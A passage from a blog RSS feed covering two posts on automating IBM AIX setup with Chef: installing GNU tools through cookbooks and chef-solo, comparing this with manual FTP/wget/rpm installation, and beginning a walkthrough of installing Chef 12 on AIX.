&lt;pre&gt;&lt;code class=&quot;lang-ruby&quot;&gt;&lt;span class=&quot;string&quot;&gt;%w(vim-common vim-enhanced)&lt;/span&gt;.each &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;|pack|&lt;/span&gt;
  aix_toolboxpackage pack &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
    action &lt;span class=&quot;symbol&quot;&gt;:install&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You find all other recipes in my &lt;a href=&quot;https://github.com/chris-rock/aix-base-setup/tree/master/recipes&quot;&gt;Github repo&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;On IBM PDC I download the required cookbooks via Chef. Since &lt;code&gt;aix-base-setup&lt;/code&gt; depends on &lt;code&gt;aix&lt;/code&gt; cookbook, we need to download multiple cookbooks for setup. I wrote a small Chef recipe to do just that. Create a new file &lt;code&gt;download.rb&lt;/code&gt; with the following content:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-ruby&quot;&gt;
&lt;span class=&quot;string&quot;&gt;%w(https://supermarket.chef.io/cookbooks/aix/download 
   https://supermarket.chef.io/cookbooks/aix-base-setup/download
)&lt;/span&gt;.each &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;|cb|&lt;/span&gt;
  &lt;span class=&quot;comment&quot;&gt;# download&lt;/span&gt;
  remote_file &lt;span class=&quot;string&quot;&gt;'download cookbook'&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
    source cb
    path &lt;span class=&quot;string&quot;&gt;'/var/chef/cookbooks/cookbook.tar.gz'&lt;/span&gt;
    notifies &lt;span class=&quot;symbol&quot;&gt;:run&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;'execute[extract-cookbook]'&lt;/span&gt;, &lt;span class=&quot;symbol&quot;&gt;:immediately&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;comment&quot;&gt;# extract&lt;/span&gt;
  execute &lt;span class=&quot;string&quot;&gt;'extract-cookbook'&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt;
    cwd &lt;span class=&quot;string&quot;&gt;'/var/chef/cookbooks/'&lt;/span&gt;
    command &lt;span class=&quot;string&quot;&gt;'gzip -d &amp;lt; /var/chef/cookbooks/cookbook.tar.gz | tar xvf -'&lt;/span&gt;
    action &lt;span class=&quot;symbol&quot;&gt;:nothing&lt;/span&gt;
  &lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;keyword&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now run &lt;code&gt;chef-apply download.rb&lt;/code&gt;. Afterwards the extracted cookbooks are located in &lt;code&gt;/var/chef/cookbooks/&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ &amp;gt; mkdir /var/chef/cookbooks
$ &amp;gt; chef-apply download.rb
[2015-01-29T08:04:38-06:00] WARN: Please install an English UTF-8 locale &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; Chef to use, falling back to C locale and disabling UTF-8 support.
[2015-01-29T08:04:43-06:00] WARN: Cloning resource attributes &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; remote_file[download cookbook] from prior resource (CHEF-3694)
[2015-01-29T08:04:43-06:00] WARN: Previous remote_file[download cookbook]: download.rb:5:&lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; `block &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; run_chef_recipe&lt;span class=&quot;string&quot;&gt;'
[2015-01-29T08:04:43-06:00] WARN: Current  remote_file[download cookbook]: download.rb:5:in `block in run_chef_recipe'&lt;/span&gt;
[2015-01-29T08:04:43-06:00] WARN: Cloning resource attributes &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; execute[extract-cookbook] from prior resource (CHEF-3694)
[2015-01-29T08:04:43-06:00] WARN: Previous execute[extract-cookbook]: download.rb:12:&lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; `block &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; run_chef_recipe&lt;span class=&quot;string&quot;&gt;'
[2015-01-29T08:04:43-06:00] WARN: Current  execute[extract-cookbook]: download.rb:12:in `block in run_chef_recipe'&lt;/span&gt;
Recipe: (chef-apply cookbook)::(chef-apply recipe)
  * remote_file[download cookbook] action create
    - create new file /var/chef/cookbooks/cookbook.tar.gz
    - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/cookbooks/cookbook.tar.gz from none to 2b736b
    (new content is binary, diff output suppressed)
  * execute[extract-cookbook] action run
    - execute gzip &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &amp;lt; /var/chef/cookbooks/cookbook.tar.gz | tar xvf -
  * execute[extract-cookbook] action run
    - execute gzip &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &amp;lt; /var/chef/cookbooks/cookbook.tar.gz | tar xvf -
  * execute[extract-cookbook] action nothing (skipped due to action :nothing)
  * remote_file[download cookbook] action create
    - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/cookbooks/cookbook.tar.gz from 2b736b to 5d59e4
    (current file is binary, diff output suppressed)
  * execute[extract-cookbook] action run
    - execute gzip &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &amp;lt; /var/chef/cookbooks/cookbook.tar.gz | tar xvf -
  * execute[extract-cookbook] action run
    - execute gzip &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &amp;lt; /var/chef/cookbooks/cookbook.tar.gz | tar xvf -
  * execute[extract-cookbook] action nothing (skipped due to action :nothing)
$ &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To apply the &lt;code&gt;aix-base-setup&lt;/code&gt;, we create a &lt;code&gt;solo.json&lt;/code&gt; and &lt;code&gt;solo.rb&lt;/code&gt;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /var/chef/
cat &amp;gt; solo.json &amp;lt;&amp;lt;EOF
{
    &lt;span class=&quot;string&quot;&gt;&quot;run_list&quot;&lt;/span&gt;:[
        &lt;span class=&quot;string&quot;&gt;&quot;recipe[aix-base-setup]&quot;&lt;/span&gt;
    ]
}
EOF

cat &amp;gt; solo.rb &amp;lt;&amp;lt;EOF
root = File.absolute_path(File.dirname(__FILE__))
node_name &lt;span class=&quot;string&quot;&gt;&quot;localhost&quot;&lt;/span&gt;
file_cache_path root
cookbook_path [ root + &lt;span class=&quot;string&quot;&gt;'/cookbooks'&lt;/span&gt;, root + &lt;span class=&quot;string&quot;&gt;'/site-cookbooks'&lt;/span&gt; ]
EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;All required files to run the coobooks are configured on the AIX machine. To install &lt;code&gt;curl&lt;/code&gt;, &lt;code&gt;wget&lt;/code&gt;, &lt;code&gt;vim&lt;/code&gt;, &lt;code&gt;zip&lt;/code&gt; and &lt;code&gt;zsh&lt;/code&gt; we start the Chef run. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;$ &amp;gt; &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /var/chef/
$ &amp;gt; chef-solo -c solo.rb -j solo.json
[2015-01-29T08:07:05-06:00] WARN: Please install an English UTF-8 locale &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; Chef to use, falling back to C locale and disabling UTF-8 support.
Starting Chef Client, version 12.0.3
Compiling Cookbooks...
Converging 9 resources
Recipe: aix-base-setup::curl
  * aix_toolboxpackage[curl] action install
    * remote_file[/var/chef/curl-7.9.3-2.aix4.3.ppc.rpm] action create
      - create new file /var/chef/curl-7.9.3-2.aix4.3.ppc.rpm
      - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/curl-7.9.3-2.aix4.3.ppc.rpm from none to 34b591
      (new content is binary, diff output suppressed)
    * rpm_package[curl] action install
      - install version 7.9.3-2 of package curl

Recipe: aix-base-setup::wget
  * aix_toolboxpackage[wget] action install
    * remote_file[/var/chef/wget-1.9.1-1.aix5.1.ppc.rpm] action create
      - create new file /var/chef/wget-1.9.1-1.aix5.1.ppc.rpm
      - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/wget-1.9.1-1.aix5.1.ppc.rpm from none to d1274c
      (new content is binary, diff output suppressed)
    * rpm_package[wget] action install
      - install version 1.9.1-1 of package wget

Recipe: aix-base-setup::vim
  * aix_toolboxpackage[vim-common] action install
    * remote_file[/var/chef/vim-common-6.3-1.aix5.1.ppc.rpm] action create
      - create new file /var/chef/vim-common-6.3-1.aix5.1.ppc.rpm
      - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/vim-common-6.3-1.aix5.1.ppc.rpm from none to 8d0c9f
      (new content is binary, diff output suppressed)
    * rpm_package[vim-common] action install
      - install version 6.3-1 of package vim-common

  * aix_toolboxpackage[vim-enhanced] action install
    * remote_file[/var/chef/vim-enhanced-6.3-1.aix5.1.ppc.rpm] action create
      - create new file /var/chef/vim-enhanced-6.3-1.aix5.1.ppc.rpm
      - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/vim-enhanced-6.3-1.aix5.1.ppc.rpm from none to 0b6e60
      (new content is binary, diff output suppressed)
    * rpm_package[vim-enhanced] action install
      - install version 6.3-1 of package vim-enhanced

Recipe: aix-base-setup::zip
  * aix_toolboxpackage[zip] action install
    * remote_file[/var/chef/zip-2.3-3.aix4.3.ppc.rpm] action create
      - create new file /var/chef/zip-2.3-3.aix4.3.ppc.rpm
      - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/zip-2.3-3.aix4.3.ppc.rpm from none to 195196
      (new content is binary, diff output suppressed)
    * rpm_package[zip] action install
      - install version 2.3-3 of package zip

  * aix_toolboxpackage[unzip] action install
    * remote_file[/var/chef/unzip-5.51-1.aix5.1.ppc.rpm] action create
      - create new file /var/chef/unzip-5.51-1.aix5.1.ppc.rpm
      - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/unzip-5.51-1.aix5.1.ppc.rpm from none to 1c0445
      (new content is binary, diff output suppressed)
    * rpm_package[unzip] action install
      - install version 5.51-1 of package unzip

Recipe: aix-base-setup::zsh
  * aix_toolboxpackage[coreutils] action install
    * remote_file[/var/chef/coreutils-5.2.1-2.aix5.1.ppc.rpm] action create
      - create new file /var/chef/coreutils-5.2.1-2.aix5.1.ppc.rpm
      - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/coreutils-5.2.1-2.aix5.1.ppc.rpm from none to 1dec06
      (new content is binary, diff output suppressed)
    * rpm_package[coreutils] action install
      - install version 5.2.1-2 of package coreutils

  * aix_toolboxpackage[grep] action install
    * remote_file[/var/chef/grep-2.5.1-1.aix4.3.ppc.rpm] action create
      - create new file /var/chef/grep-2.5.1-1.aix4.3.ppc.rpm
      - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/grep-2.5.1-1.aix4.3.ppc.rpm from none to 805523
      (new content is binary, diff output suppressed)
    * rpm_package[grep] action install
      - install version 2.5.1-1 of package grep

  * aix_toolboxpackage[zsh] action install
    * remote_file[/var/chef/zsh-4.0.4-3.aix5.1.ppc.rpm] action create
      - create new file /var/chef/zsh-4.0.4-3.aix5.1.ppc.rpm
      - update content &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; file /var/chef/zsh-4.0.4-3.aix5.1.ppc.rpm from none to 3eb16c
      (new content is binary, diff output suppressed)
    * rpm_package[zsh] action install
      - install version 4.0.4-3 of package zsh


Running handlers:
Running handlers complete
Chef Client finished, 27/27 resources updated &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 35.332408 seconds
$ &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We are ready to use the system with a basic setup.&lt;/p&gt;
&lt;h2 id=&quot;the-classic-way&quot;&gt;The classic way&lt;/h2&gt;
&lt;p&gt;For comparison, I will highlight the installation of the same tools with a manual installation. First, we need to ensure that we are able to install rpm packages. RPM can be downloaded from &lt;a href=&quot;ftp://public.dhe.ibm.com/aix/freeSoftware/aixtoolbox/INSTALLP/ppc/rpm.rte&quot;&gt;IBM’s FTP server&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;l5a1vp051_pub[/home/u0015844] &amp;gt; ftp ftp.software.ibm.com
Connected to dispsd-40-www3.boulder.ibm.com.
220 service.boulder.ibm.com FTP server (Version wu-2.6.2.1(5) Custom Tue Aug 17 13:28:23 MDT 2010) ready.
Name (ftp.software.ibm.com:u0015844): ftp
331 Guest login ok, send any password.
Password:
230 Guest login ok, access restrictions apply.
ftp&amp;gt; &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; aix/freeSoftware/aixtoolbox/INSTALLP/ppc
250 CWD &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; successful.
ftp&amp;gt; binary
200 Type &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; to I.
ftp&amp;gt; get rpm.rte
200 PORT &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; successful.
150 Opening BINARY mode data connection &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; rpm.rte (2408448 bytes).
226 Transfer complete.
2408448 bytes received &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 1.299 seconds (1811 Kbytes/s)
&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;: rpm.rte remote: rpm.rte
ftp&amp;gt; quit
221-You have transferred 2408448 bytes &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 1 files.
221-Total traffic &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; this session was 2410547 bytes &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 1 transfers.
221-Thank you &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; using the FTP service on service.boulder.ibm.com.
221 Goodbye.

installp -qaXgd rpm.rte rpm.rte
+-----------------------------------------------------------------------------+
                    Pre-installation Verification...
+-----------------------------------------------------------------------------+
Verifying selections...done
Verifying requisites...done
Results...

WARNINGS
--------
  Problems described &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; this section are not likely to be the &lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; of any
  immediate or serious failures, but further actions may be necessary or
  desired.

  Already Installed
  -----------------
  The number of selected filesets that are either already installed
  or effectively installed through superseding filesets is 1.  See
  the summaries at the end of this installation &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; details.

  NOTE:  Base level filesets may be reinstalled using the &lt;span class=&quot;string&quot;&gt;&quot;Force&quot;&lt;/span&gt;
  option (-F flag), or they may be removed, using the deinstall or
  &lt;span class=&quot;string&quot;&gt;&quot;Remove Software Products&quot;&lt;/span&gt; facility (-u flag), and &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt; reinstalled.

  &amp;lt;&amp;lt; End of Warning Section &amp;gt;&amp;gt;

+-----------------------------------------------------------------------------+
                   BUILDDATE Verification ...
+-----------------------------------------------------------------------------+
Verifying build dates...done
FILESET STATISTICS
------------------
    1  Selected to be installed, of &lt;span class=&quot;built_in&quot;&gt;which&lt;/span&gt;:
        1  Already installed (directly or via superseding filesets)
  ----
    0  Total to be installed


Pre-installation Failure/Warning Summary
----------------------------------------
Name                      Level           Pre-installation Failure/Warning
-------------------------------------------------------------------------------
rpm.rte                   3.0.5.52        Already installed

l5a1vp051_pub[/home/u0015844] &amp;gt;
```bash

Once we have FTP, we are ready to download wget to easy the installation of the following tools. 

```bash
l5a1vp051_pub[/home/u0015844] &amp;gt; ftp ftp.software.ibm.com
Connected to dispsd-40-www3.boulder.ibm.com.
220 service.boulder.ibm.com FTP server (Version wu-2.6.2.1(5) Custom Tue Aug 17 13:28:23 MDT 2010) ready.
Name (ftp.software.ibm.com:u0015844): ftp
331 Guest login ok, send any password.
Password:
230 Guest login ok, access restrictions apply.
ftp&amp;gt; &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; aix/freeSoftware/aixtoolbox/RPMS/ppc/wget
250 CWD &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; successful.
ftp&amp;gt; binary
200 Type &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; to I.
ftp&amp;gt; get wget-1.9.1-3.aix6.1.ppc.rpm
200 PORT &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; successful.
150 Opening BINARY mode data connection &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; wget-1.9.1-3.aix6.1.ppc.rpm (465606 bytes).
226 Transfer complete.
465606 bytes received &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 0.8058 seconds (564.3 Kbytes/s)
&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;: wget-1.9.1-3.aix6.1.ppc.rpm remote: wget-1.9.1-3.aix6.1.ppc.rpm
ftp&amp;gt; quit
221-You have transferred 465606 bytes &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 1 files.
221-Total traffic &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; this session was 468128 bytes &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 2 transfers.
221-Thank you &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; using the FTP service on service.boulder.ibm.com.
221 Goodbye.
l5a1vp051_pub[/home/u0015844] &amp;gt; rpm -hUv wget-1.9.1-3.aix6.1.ppc.rpm
wget                        &lt;span class=&quot;comment&quot;&gt;##################################################&lt;/span&gt;
l5a1vp051_pub[/home/u0015844] &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since wget is available on AIX now, we can use it to download all required rpm packages.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Download the vim binaries&lt;/span&gt;
wget -r -nd ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/vim/vim-common-6.3-1.aix5.1.ppc.rpm
wget -r -nd ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/vim/vim-enhanced-6.3-1.aix5.1.ppc.rpm
&lt;span class=&quot;comment&quot;&gt;# Install vim&lt;/span&gt;
rpm -hUv vim-common-6.3-1.aix5.1.ppc.rpm vim-enhanced-6.3-1.aix5.1.ppc.rpm
vim-common                  &lt;span class=&quot;comment&quot;&gt;##################################################&lt;/span&gt;
vim-enhanced                &lt;span class=&quot;comment&quot;&gt;##################################################&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Download &amp;amp; Install curl&lt;/span&gt;
wget -r -nd ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/curl/curl-7.9.3-2.aix4.3.ppc.rpm
&lt;span class=&quot;comment&quot;&gt;# Install vim&lt;/span&gt;
rpm -hUv curl-7.9.3-2.aix4.3.ppc.rpm
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Download &amp;amp; Install the zsh binaries&lt;/span&gt;
wget -r -nd ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/zsh/zsh-4.0.4-3.aix5.1.ppc.rpm
wget -r -nd ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/coreutils/coreutils-5.2.1-2.aix5.1.ppc.rpm
wget -r -nd ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/grep/grep-2.5.1-1.aix4.3.ppc.rpm
rpm -hUv zsh-4.0.4-3.aix5.1.ppc.rpm coreutils-5.2.1-2.aix5.1.ppc.rpm grep-2.5.1-1.aix4.3.ppc.rpm
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Download &amp;amp; Install zip&lt;/span&gt;
wget -r -nd ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/zip/zip-2.3-3.aix4.3.ppc.rpm
wget -r -nd ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/unzip/unzip-5.51-1.aix5.1.ppc.rpm
su root -c rpm -hUv zip-2.3-3.aix4.3.ppc.rpm unzip-5.51-1.aix5.1.ppc.rpm
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finally, we have reached the final setup.&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Both, the manual and Chef approach, are valid ways to setup a machine. If you need to setup 5 packages, the effort is nearly the same. Chef will become more efficient if you go further and start changing system and application configuration as well as installing more packages. It will become very handy to manage the setup in Chef, because the manual steps required on the system keep the same, no matter how many steps are involved in your cookbooks. This improves the deployment time and decreases the time of reoccurring tasks.&lt;/p&gt;
&lt;p&gt;Questions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Why not use knife bootstrap?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Currently, knife bootstrap does not work with AIX, I opened a &lt;a href=&quot;https://github.com/chef/chef/issues/2836&quot;&gt;ticket&lt;/a&gt; to address this issue. Additionally I had to work on systems that are only reachable via jump hosts. The Chef-Solo approach helped to use the power of Chef within existing infrastructure. Ops teams can use the existing infrastructure and migrate slowly to an environment where the complete setup is managed via Configuration Management tools.&lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www-03.ibm.com/systems/power/software/aix/linux/toolbox/altlic.html&quot;&gt;AIX Toolbox for Linux Applications&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www-03.ibm.com/systems/power/software/aix/linux/toolbox/download.html&quot;&gt;IBM AIX Toolbox download informationn&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;ftp://public.dhe.ibm.com/aix/freeSoftware/aixtoolbox/README.txt&quot;&gt;AIX Toolbox for Linux Applications README&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;ftp://ftp.software.ibm.com/aix/freeSoftware/aixtoolbox/RPMS/ppc/&quot;&gt;AIX Toolbox Repositoryy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://aix4admins.blogspot.de/2011/06/commands-oslevel-shows-actual-bos-level.html&quot;&gt;AIX for System Administrators&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Chef loves AIX - Mainframe Automation</title>
      <link>http://lollyrock.com/articles/ibm-aix-chef/</link>
      <pubDate>Tue, 02 Dec 2014 18:00:00 -0600</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/ibm-aix-chef/</guid>
      <author></author>
      <description>&lt;p&gt;I was very exited to play with IBM AIX and Chef 12. Coming from an Open Stack background with deep knowledge about automation and security with RedHat Linux and Windows Server, I was looking forward to gain insights about using the configuration management tool Chef with AIX. I have done some big deployments on cloud infrastructures and I am very pleased to see some technologies finding their way into core enterprise applications.&lt;/p&gt;
&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;With Chef, you can automate how you build, deploy, and manage your infrastructure. Your infrastructure becomes versionable, testable, and repeatable as application code which is especially relevant if you maintain a mission-critical system. Every deployment is required to go through a rigid approval process via staging environments to ensure that the customer will not notice any service interruptions.&lt;/p&gt;
&lt;p&gt;AIX is a great platform for such mission critical systems, because it provides a high level of performance and reliability. Due to the fact, that it runs on &lt;a href=&quot;http://www.ibm.com/systems/power/&quot;&gt;IBM Power Systems&lt;/a&gt;, it is also very scalable.&lt;/p&gt;
&lt;p&gt;Before I walk you through the details of Chef on AIX, I would like to thank &lt;a href=&quot;https://twitter.com/julian_dunn&quot;&gt;Julian from Chef Inc.&lt;/a&gt; for his exceptional support over the last months. Additionally, I like to thank IBM for providing the amazing &lt;a href=&quot;http://www.ibm.com/partnerworld/pdp&quot;&gt;IBM Power Development Cloud&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;getting-started-with-chef-on-aix&quot;&gt;Getting started with Chef on AIX&lt;/h2&gt;
&lt;p&gt;The following tests are executed on vanilla AIX 7.1. I installed some GNU tools like vim, zsh and wget to get a nice console feeling. Finally, I was ready to download and install Chef 12. The AIX version of Chef is supported for AIX 6.1 and AIX 7.1 and you can read more about the announcement at &lt;a href=&quot;http://lists.opscode.com/sympa/arc/chef/2014-11/msg00038.html&quot;&gt;Chef Lists&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;l5a1vp051_pub &amp;gt; wget -r -nd http://opscode-omnibus-packages.s3.amazonaws.com/aix/6.1/powerpc/chef-12.0.0-rc.0-1.powerpc.bff
--10:18:05--  http://opscode-omnibus-packages.s3.amazonaws.com/aix/6.1/powerpc/chef-12.0.0-rc.0-1.powerpc.bff
           =&amp;gt; `chef-12.0.0-rc.0-1.powerpc.bff&lt;span class=&quot;string&quot;&gt;'
Resolving opscode-omnibus-packages.s3.amazonaws.com... 54.231.64.169
Connecting to opscode-omnibus-packages.s3.amazonaws.com[54.231.64.169]:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 86,565,376 [binary/octet-stream]

100%[=========================================================================================&amp;gt;] 86,565,376    23.55M/s    ETA 00:00

10:18:09 (22.67 MB/s) - `chef-12.0.0-rc.0-1.powerpc.bff'&lt;/span&gt; saved [86565376/86565376]


FINISHED --10:18:09--
Downloaded: 86,565,376 bytes &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 1 files
l5a1vp051_pub &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Chef delivers in a AIX backup file format (similar to unix tar format). To install the content, we need to know the fileset name. We display the content with &lt;code&gt;installp -ld chef-12.0.0-rc.0-1.powerpc.bff&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;l5a1vp051_pub &amp;gt; installp -ld chef-12.0.0-rc.0-1.powerpc.bff
  Fileset Name                Level                     I/U Q Content
  ====================================================================
  chef                        12.0.0.1                   I  N usr,root
&lt;span class=&quot;comment&quot;&gt;#   The full stack of chef&lt;/span&gt;
l5a1vp051_pub &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, we collected all required information to start the installation. We use &lt;code&gt;installp&lt;/code&gt; with the preview flag, to verify that everything works as intended: &lt;code&gt;installp -apXY -d chef-12.0.0-rc.0-1.powerpc.bff chef&lt;/code&gt;. In case you are not familliar with the flags: &lt;code&gt;a: apply&lt;/code&gt;, &lt;code&gt;p: preview&lt;/code&gt;, &lt;code&gt;X: extend fs&lt;/code&gt; and &lt;code&gt;Y: accepts license agreements&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;l5a1vp051_pub &amp;gt; installp -apXY &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; chef-12.0.0-rc.0-1.powerpc.bff chef
*******************************************************************************
installp PREVIEW:  installation will not actually occur.
*******************************************************************************

+-----------------------------------------------------------------------------+
                    Pre-installation Verification...
+-----------------------------------------------------------------------------+
Verifying selections...done
Verifying requisites...done
Results...

SUCCESSES
---------
  Filesets listed &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; this section passed pre-installation verification
  and will be installed.

  Selected Filesets
  -----------------
  chef 12.0.0.1                               &lt;span class=&quot;comment&quot;&gt;# The full stack of chef&lt;/span&gt;

  &amp;lt;&amp;lt; End of Success Section &amp;gt;&amp;gt;

+-----------------------------------------------------------------------------+
                   BUILDDATE Verification ...
+-----------------------------------------------------------------------------+
Verifying build dates...done
FILESET STATISTICS
------------------
    1  Selected to be installed, of &lt;span class=&quot;built_in&quot;&gt;which&lt;/span&gt;:
        1  Passed pre-installation verification
  ----
    1  Total to be installed

RESOURCES
---------
  Estimated system resource requirements &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; filesets being installed:
                (All sizes are &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; 512-byte blocks)
      Filesystem                     Needed Space             Free Space
      /                                   15676                 363384
      /usr                                37276                 380312
      /opt                               291496                 132640
      -----                            --------                 ------
      TOTAL:                             344448                 876336

  NOTE:  &lt;span class=&quot;string&quot;&gt;&quot;Needed Space&quot;&lt;/span&gt; values are calculated from data available prior
  to installation.  These are the estimated resources required &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; the
  entire operation.  Further resource checks will be made during
  installation to verify that these initial estimates are sufficient.

